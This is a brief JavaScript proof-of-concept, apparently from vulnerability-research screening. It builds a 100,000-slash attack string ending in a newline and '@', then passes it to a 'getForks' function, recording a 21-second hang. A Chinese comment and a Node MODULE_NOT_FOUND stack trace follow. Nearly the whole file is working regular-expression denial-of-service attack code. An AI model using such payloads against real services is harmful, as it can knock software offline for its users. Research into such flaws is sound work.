"use strict";

var _modules = require("./modules.js");
//Attack String :""+"/"*100000+"\n@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "/";
}
str += "\n@";
var result = (0, _modules.getForks)("", str);
console.log(result);

// real    0m20.991s
// user    0m20.934s
// sys     0m0.020s

/*
出现以下报错信息,尚不清楚是否有影响:
Require stack:
- /mnt/d/VSCode_Projects_are_here/ManualScreening1/succeed/3/modules.js
    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:815:15)
    at Function.Module._load (internal/modules/cjs/loader.js:667:27)
    at Module.require (internal/modules/cjs/loader.js:887:19)
    at require (internal/modules/cjs/helpers.js:85:18)
    at getDependencies (file:///mnt/d/VSCode_Projects_are_here/ManualScreening1/succeed/3/modules.js:53:23)    
    at file:///mnt/d/VSCode_Projects_are_here/ManualScreening1/succeed/3/modules.js:67:26
    at Array.forEach (<anonymous>)
    at getForks (file:///mnt/d/VSCode_Projects_are_here/ManualScreening1/succeed/3/modules.js:66:22)
    at file:///mnt/d/VSCode_Projects_are_here/ManualScreening1/succeed/3/poc.js:10:14
    at ModuleJob.run (internal/modules/esm/module_job.js:145:37) {
  code: 'MODULE_NOT_FOUND',
  requireStack: [
    '/mnt/d/VSCode_Projects_are_here/ManualScreening1/succeed/3/modules.js'
  ]
}
*/